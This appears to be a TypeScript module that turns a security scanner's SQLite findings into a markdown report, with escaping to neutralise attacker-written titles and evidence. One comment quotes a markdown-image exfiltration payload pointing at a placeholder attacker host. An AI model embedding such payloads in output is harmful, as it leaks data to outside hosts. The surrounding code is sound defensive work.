/**
 * Report rendering. No LLM — SQLite in, markdown out (plan §1).
 *
 * Outputs are attack surfaces, because every finding carries attacker-authored
 * prose (plan §8). Prose is stripped of control characters at the write
 * boundary; here it is additionally kept out of any position where markdown
 * would execute it.
 */

import type { Candidate, Coverage, ScanRecord } from "../types.js";
import { formatSeverity, renderMatrix, severityRank } from "./severity.js";

export interface ReportInput {
	scan: ScanRecord;
	repoName: string;
	repoPath: string;
	candidates: Candidate[];
	coverage: Coverage;
	leads: Array<{ worker_id: string; text: string; status: string }>;
	languages: string[];
	excludedFiles: number;
	modelRef: string;
	promptHash: string;
	/** How ownership was split. One probe owning most of a repo is a weaker claim. */
	partitions?: string;
	/**
	 * Where the threat model came from. A scan run against a threat model the
	 * user edited is a different claim from one that wrote its own, and the
	 * reader of the report cannot tell unless it says so.
	 */
	threatModel?: string;
}

export function renderMarkdown(r: ReportInput): string {
	const out: string[] = [];

	const merged = new Set(r.candidates.filter((c) => c.merged_into).map((c) => c.id));
	const live = r.candidates.filter((c) => !merged.has(c.id));

	const confirmed = live
		.filter((c) => c.resolution?.disposition === "confirmed")
		.sort((a, b) => {
			const sa = a.resolution?.computed?.severity ?? "info";
			const sb = b.resolution?.computed?.severity ?? "info";
			return severityRank(sa) - severityRank(sb);
		});
	const suppressed = live.filter((c) => c.resolution?.disposition === "suppressed");
	const notApplicable = live.filter((c) => c.resolution?.disposition === "not_applicable");
	const followUp = live.filter(
		(c) => !c.resolution || c.resolution.disposition === "needs_follow_up",
	);

	out.push(`# Security scan: ${esc(r.repoName)}`, "");
	out.push("| | |", "|---|---|");
	out.push(`| repository | \`${esc(r.repoPath)}\` |`);
	out.push(`| revision | ${r.scan.revision ? `\`${esc(r.scan.revision)}\`` : "_not a git repo_"} |`);
	out.push(`| profile | **${r.scan.profile}**${r.scan.profile === "static" ? " — nothing was executed" : ""} |`);
	out.push(`| model | \`${esc(r.modelRef)}\` |`);
	out.push(`| prompts | \`${esc(r.promptHash)}\` |`);
	if (r.threatModel) out.push(`| threat model | ${esc(r.threatModel)} |`);
	out.push(`| started | ${r.scan.started_at} |`);
	out.push(`| tokens | ${r.scan.tokens_in.toLocaleString()} in / ${r.scan.tokens_out.toLocaleString()} out |`);
	out.push(`| cost | ${r.scan.cost_usd > 0 ? `$${r.scan.cost_usd.toFixed(4)}` : "_not priced_"} |`);
	out.push("");

	// --- coverage -----------------------------------------------------------
	const pctFiles = pct(r.coverage.files_touched, r.coverage.files_in_scope);
	const pctBytes = pct(r.coverage.bytes_read, r.coverage.bytes_in_scope);
	out.push("## Coverage", "");
	out.push(`- **${r.coverage.files_touched} / ${r.coverage.files_in_scope} files touched** (${pctFiles})`);
	out.push(`- **${fmtBytes(r.coverage.bytes_read)} / ${fmtBytes(r.coverage.bytes_in_scope)} read** (${pctBytes}) — the number to trust`);
	out.push(`- ${r.excludedFiles} files excluded from scope with a recorded reason`);
	if (r.partitions) out.push(`- ownership: ${esc(r.partitions)}`);
	out.push("");
	out.push(
		"> Coverage is derived from the read and grep calls that actually happened, not",
		"> from anything the agents claimed. It is a **laziness detector, not proof of",
		"> review**: a file that was read is not thereby a file that was understood.",
		"",
	);
	if (r.languages.length > 0) {
		out.push(`Extensions in scope: ${r.languages.map((l) => `\`.${esc(l)}\``).join(", ")}.`, "");
	}

	// --- findings -----------------------------------------------------------
	out.push("## Findings", "");
	if (confirmed.length === 0) {
		out.push("_No confirmed findings._", "");
		if (followUp.length > 0) {
			out.push(
				`That is not the same as a clean scan: ${followUp.length} candidate(s) below could not be settled.`,
				"",
			);
		}
	} else {
		out.push("| # | severity | confidence | finding | location |", "|---|---|---|---|---|");
		for (const c of confirmed) {
			const comp = c.resolution?.computed;
			const loc = c.locations[0];
			out.push(
				`| ${c.id} | ${comp ? formatSeverity(comp) : "?"} | ${comp?.confidence.toFixed(1) ?? "?"} | ${escInline(c.title)} | \`${loc ? `${esc(loc.path)}:${loc.start_line}` : "?"}\` |`,
			);
		}
		out.push("");
		for (const c of confirmed) out.push(...renderFinding(c));
	}

	// --- everything else ----------------------------------------------------
	if (followUp.length > 0) {
		out.push("## Needs follow-up", "");
		out.push(
			"These could not be settled either way. They degrade this scan's claim rather",
			"than disappearing from it.",
			"",
		);
		for (const c of followUp) {
			out.push(
				`- **${c.id}** ${escInline(c.title)} — \`${firstLoc(c)}\`${
					c.resolution?.rationale ? `\n  ${esc(c.resolution.rationale)}` : ""
				}`,
			);
		}
		out.push("");
	}

	if (suppressed.length > 0) {
		out.push("## Suppressed", "");
		const repoClaims = suppressed.filter(
			(c) => c.resolution?.inputs?.suppression?.source === "repo_claim",
		).length;
		if (repoClaims > 0) {
			out.push(
				`> ${repoClaims} candidate(s) suppressed on in-repo policy claims. A repository`,
				"> asserting something is out of scope is evidence, not policy.",
				"",
			);
		}
		for (const c of suppressed) {
			const why = c.resolution?.computed?.rationale?.[0] ?? c.resolution?.rationale ?? "";
			out.push(`- **${c.id}** ${escInline(c.title)} — ${escInline(why)}`);
		}
		out.push("");
	}

	if (notApplicable.length > 0) {
		out.push("## Not applicable", "");
		for (const c of notApplicable) {
			out.push(`- **${c.id}** ${escInline(c.title)} — ${escInline(c.resolution?.rationale ?? "")}`);
		}
		out.push("");
	}

	if (merged.size > 0) {
		out.push("## Merged as duplicates", "");
		out.push(
			"Merged rows are kept, never deleted. Two probes reaching the same conclusion",
			"is evidence about the search, not about the finding.",
			"",
		);
		for (const c of r.candidates.filter((x) => x.merged_into)) {
			out.push(
				`- **${c.id}** ${escInline(c.title)} → merged into **${escInline(c.merged_into ?? "?")}**: ${escInline(c.resolution?.rationale ?? "")}`,
			);
		}
		out.push("");
	}

	const deadEnds = r.leads.filter((l) => l.status === "dead_end");
	if (deadEnds.length > 0) {
		out.push("## Leads that went nowhere", "");
		out.push(
			'"No findings" from an agent that never looked is indistinguishable from "no',
			'findings" from an agent that looked hard — unless the dead ends are written',
			"down. These are they.",
			"",
		);
		for (const l of deadEnds) out.push(`- ${escInline(l.text)}`);
		out.push("");
	}

	out.push("---", "", "## How severity was computed", "");
	out.push(
		"Severity is computed from observable inputs, not chosen by a model. Suppression",
		"is a gate before the matrix, so low impact downgrades but never discards.",
		"",
	);
	out.push(renderMatrix(), "");
	out.push(
		"Confidence is bound to method: reproduced PoC 1.0, ASan 0.9, debugger 0.8,",
		"code understanding alone 0.3, counterevidence 0.0.",
		"",
	);
	if (r.scan.profile === "static") {
		out.push(
			"This scan ran under the **static** profile. Nothing was executed, so no finding",
			"here carries execution proof, and any critical is marked `(unproven)`.",
			"",
		);
	}

	return out.join("\n");
}

function renderFinding(c: Candidate): string[] {
	const comp = c.resolution?.computed;
	const inputs = c.resolution?.inputs;
	const out: string[] = [];

	out.push(`### ${c.id} — ${escInline(c.title)}`, "");
	out.push(
		`**${comp ? formatSeverity(comp) : "unrated"}**` +
			(comp ? ` · confidence ${comp.confidence.toFixed(1)}` : "") +
			(c.cwe_ids.length ? ` · ${c.cwe_ids.map(esc).join(", ")}` : ""),
		"",
	);
	if (comp?.proof_gap) {
		out.push(`> \`proof_gap: ${comp.proof_gap}\` — this severity is asserted from code, not demonstrated.`, "");
	}

	out.push("**Locations**", "");
	for (const l of c.locations) {
		out.push(`- \`${escInline(l.path)}:${l.start_line}-${l.end_line}\`${l.symbol ? ` — \`${escInline(l.symbol)}\`` : ""}`);
	}
	out.push("");

	out.push("**What an attacker gets**", "", esc(c.summary), "");
	out.push("**Evidence**", "", quote(c.evidence), "");

	// Both passes, separately attributed. A reader who disagrees with the rating
	// should be able to see whether the disagreement is about whether the bug is
	// real or about how far it reaches — they are different arguments, made by
	// different agents, and collapsing them into one paragraph hides which.
	if (c.resolution?.validation) {
		out.push("**Validation**", "", esc(c.resolution.validation.rationale), "");
	}

	const reach = c.resolution?.attack_path?.reachability;
	if (reach) {
		out.push("**Attack path**", "");
		if (reach.entry_point) out.push(`- **entry** — ${escInline(reach.entry_point)}`);
		for (const hop of reach.path) out.push(`- ${escInline(hop)}`);
		out.push("");
		if (reach.controls.length > 0) {
			out.push(`Controls on this path: ${reach.controls.map(escInline).join("; ")}.`, "");
		} else if (reach.path.length > 0) {
			out.push("**No control was found on this path.**", "");
		}
		if (c.resolution?.attack_path?.rationale) {
			out.push(esc(c.resolution.attack_path.rationale), "");
		}
	}

	if (inputs) {
		// Every input, including the two that promote a finding to critical.
		// Printing the conclusion while hiding what caused it is the one thing a
		// report whose pitch is "a severity you can defend" cannot do.
		out.push("**Severity inputs**", "");
		out.push(
			`\`impact=${inputs.impact}\` \`vector=${inputs.vector}\` \`auth_required=${inputs.auth_required}\` ` +
				`\`network_reachable=${inputs.network_reachable}\` \`cross_tenant=${inputs.cross_tenant}\` ` +
				`\`traced_path_no_control=${inputs.traced_path_no_control}\` ` +
				`\`code_execution_proven=${inputs.code_execution_proven}\` \`method=${inputs.method}\``,
			"",
		);
	}
	if (comp?.rationale.length) {
		for (const line of comp.rationale) out.push(`- ${escInline(line)}`);
		out.push("");
	}
	return out;
}

function firstLoc(c: Candidate): string {
	const l = c.locations[0];
	return l ? `${esc(l.path)}:${l.start_line}` : "?";
}

/**
 * Neutralize markdown/HTML that arrived as finding prose. Control characters
 * and secret-shaped strings were already handled at the write boundary; this
 * stops a title from opening a tag, breaking out of a table cell, or turning
 * into an image that fires a request when the report is opened.
 *
 * `!` and `[` matter more than they look: `![x](https://attacker/?leak)` in a
 * finding title renders as an image in every markdown viewer, which is a
 * read-receipt on a security report.
 */
function esc(s: string): string {
	return String(s)
		.replaceAll("<", "&lt;")
		.replaceAll(">", "&gt;")
		.replaceAll("|", "\\|")
		.replaceAll("[", "\\[")
		.replaceAll("]", "\\]")
		.replaceAll("!", "\\!");
}

/**
 * For anywhere the text must stay on one line — table cells, headings, list
 * items. A newline in a title otherwise terminates the row and the remainder
 * is emitted as document-level markdown, which lets a finding forge sections
 * and severities.
 */
function escInline(s: string): string {
	return esc(String(s).replace(/[\r\n]+/g, " ")).trim();
}

/** Evidence is quoted, never fenced — a fence in the payload would close ours. */
function quote(s: string): string {
	return String(s)
		.split("\n")
		.map((l) => `> ${esc(l)}`)
		.join("\n");
}

function pct(n: number, d: number): string {
	if (d === 0) return "n/a";
	return `${((n / d) * 100).toFixed(0)}%`;
}

function fmtBytes(n: number): string {
	if (n < 1024) return `${n} B`;
	if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
	return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}
